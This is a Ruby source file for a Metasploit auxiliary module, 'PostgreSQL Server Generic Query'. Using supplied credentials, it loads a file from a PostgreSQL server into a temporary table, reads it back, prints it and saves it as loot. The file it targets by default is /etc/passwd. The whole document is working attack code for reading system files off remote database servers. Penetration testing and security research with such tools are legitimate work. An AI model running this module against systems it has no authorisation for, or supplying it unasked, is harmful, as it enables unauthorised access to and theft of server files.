##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Postgres
  include Msf::Auxiliary::Report
  include Msf::OptionalSession::PostgreSQL

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'PostgreSQL Server Generic Query',
      'Description'    => %q{
          This module imports a file local on the PostgreSQL Server into a
          temporary table, reads it, and then drops the temporary table.
          It requires PostgreSQL credentials with table CREATE privileges
          as well as read privileges to the target file.
      },
      'Author'         => [ 'todb' ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        OptString.new('RFILE', [ true, 'The remote file', '/etc/passwd'])
      ]
    )

    deregister_options( 'SQL', 'RETURN_ROWSET' )
  end

  def rhost
    datastore['RHOST']
  end

  def rport
    datastore['RPORT']
  end

  def run
    self.postgres_conn = session.client if session
    ret = postgres_read_textfile(datastore['RFILE'])
    case ret.keys[0]
    when :conn_error
      print_error "#{rhost}:#{rport} Postgres - Authentication failure, could not connect."
    when :sql_error
      case ret[:sql_error]
      when /^C58P01/
        print_error "#{postgres_conn.peerhost}:#{postgres_conn.peerport} Postgres - No such file or directory."
        vprint_status "#{postgres_conn.peerhost}:#{postgres_conn.peerport} Postgres - #{ret[:sql_error]}"
      when /^C42501/
        print_error "#{postgres_conn.peerhost}:#{postgres_conn.peerport} Postgres - Insufficient file permissions."
        vprint_status "#{postgres_conn.peerhost}:#{postgres_conn.peerport} Postgres - #{ret[:sql_error]}"
      else
        print_error "#{postgres_conn.peerhost}:#{postgres_conn.peerport} Postgres - #{ret[:sql_error]}"
      end
    when :complete
      loot = ''
      ret[:complete].rows.each { |row|
        print_line(row.first)
        loot << row.first
      }
      # No idea what the actual ctype will be, text/plain is just a guess
      path = store_loot('postgres.file', 'text/plain', postgres_conn.peerhost, loot, datastore['RFILE'])
      print_good("#{postgres_conn.peerhost}:#{postgres_conn.peerport} Postgres - #{datastore['RFILE']} saved in #{path}")
      vprint_good  "#{postgres_conn.peerhost}:#{postgres_conn.peerport} Postgres - Command complete."
    end
    postgres_logout if self.postgres_conn && session.blank?
  end
end
